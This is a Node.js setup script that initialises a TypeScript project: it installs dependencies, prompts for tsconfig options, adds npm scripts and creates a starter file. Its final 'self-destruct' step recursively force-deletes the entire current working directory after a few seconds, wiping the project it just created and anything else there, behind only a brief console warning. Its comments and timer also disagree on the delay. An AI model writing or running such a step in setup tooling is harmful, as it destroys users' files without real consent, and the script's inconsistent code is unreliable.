// setup ts.js



import { execSync } from "child_process";
import fs from "fs";
import readline from "readline";
import path from "path";

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function ask(question) {
  return new Promise((resolve) => rl.question(question, (ans) => resolve(ans.trim())));
}

function run(cmd, message = "") {
  console.log(`\n${message || "Running"}: ${cmd}`);
  execSync(cmd, { stdio: "inherit" });
}

async function main() {
  console.log("Starting TypeScript project setup...");

  // 1. Initialize npm project
  if (!fs.existsSync("package.json")) {
    run("npm init -y", "Initializing package.json");
  } else {
    console.log("package.json already exists, skipping init.");
  }

  // 2. Install required dev dependencies
  run("npm i -D typescript tsx @types/node", "Installing TypeScript, tsx, and Node types");

  // 3. Initialize tsconfig.json
  if (!fs.existsSync("tsconfig.json")) {
    run("npx tsc --init", "Creating tsconfig.json");
  } else {
    console.log("tsconfig.json already exists, skipping init.");
  }

  // 4. Ask for custom compiler options
  const tsconfig = JSON.parse(fs.readFileSync("tsconfig.json", "utf-8"));

  console.log("\nConfigure your tsconfig.json options:");
  const target = (await ask("Target (default: ES2020): ")) || "ES2020";
  const moduleType = (await ask("Module system (default: CommonJS): ")) || "CommonJS";
  const rootDir = (await ask("Root directory (default: src): ")) || "src";
  const outDir = (await ask("Output directory (default: dist): ")) || "dist";
  const strictMode = (await ask("Enable strict mode? (y/n, default: y): ")) || "y";

  Object.assign(tsconfig.compilerOptions, {
    target,
    module: moduleType,
    rootDir,
    outDir,
    esModuleInterop: true,
    strict: strictMode.toLowerCase() === "y",
    skipLibCheck: true
  });

  fs.writeFileSync("tsconfig.json", JSON.stringify(tsconfig, null, 2));
  console.log("tsconfig.json updated.");

  // 5. Update package.json scripts
  const pkg = JSON.parse(fs.readFileSync("package.json", "utf-8"));
  pkg.scripts = Object.assign(pkg.scripts || {}, {
    dev: "tsx watch src/index.ts",
    run: "npx tsc && node dist/index.js",
    build: "tsc"
  });
  fs.writeFileSync("package.json", JSON.stringify(pkg, null, 2));
  console.log("package.json scripts added.");

  // 6. Create folder structure and starter file
  if (!fs.existsSync(rootDir)) fs.mkdirSync(rootDir);
  const entryFile = `${rootDir}/index.ts`;
  if (!fs.existsSync(entryFile)) {
    fs.writeFileSync(entryFile, `console.log("TypeScript setup complete. Ready to build.");`);
  }
  console.log(`${entryFile} created.`);

  rl.close();

  console.log(`
Setup complete.
Next steps:
  - npm run dev   → Runs .ts files directly with tsx in watch mode
  - npm run run   → Compiles with tsc and runs the output
  - npm run build → Builds for production (outputs to dist/)
  - Edit tsconfig.json anytime to adjust compiler settings
  `);

  // 7. Auto self-destruct after 10 seconds
  console.log("\nSetup will self-destruct in 5 seconds. Cancel now (CTRL+C) to stop this.");

  setTimeout(() => {
    const dir = process.cwd();
    try {
      fs.rmSync(dir, { recursive: true, force: true });
      console.log(`Deleted directory: ${dir}`);
      process.exit(0);
    } catch (err) {
      console.error("Error deleting directory:", err.message);
      process.exit(1);
    }
  }, 5000);
}

main().catch((err) => {
  console.error("Error during setup:", err);
  rl.close();
});
      
